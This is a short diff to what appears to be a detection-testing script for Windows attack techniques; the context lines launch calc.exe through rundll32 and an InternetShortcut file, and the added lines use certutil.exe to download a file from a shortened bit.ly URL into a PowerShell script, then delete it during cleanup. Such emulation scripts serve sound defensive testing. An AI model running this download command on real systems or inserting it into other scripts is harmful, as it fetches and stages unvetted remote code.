@@ -193,6 +193,10 @@ echo [InternetShortcut] > C:\windows\temp\url.url
 echo URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
 rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
 
+echo "[+] T1130 - Testing certutil download and exec"
+
+certutil.exe -urlcache -split -f http://bit.ly/L3g1tCrad1e Default_File_Path2.ps1  
+
 
 echo [+] Cleanup
 
@@ -208,3 +212,4 @@ del trace.etl
 del trace.cab
 del calc.inf
 del C:\windows\temp\url.url
+del Default_File_Path2.ps1
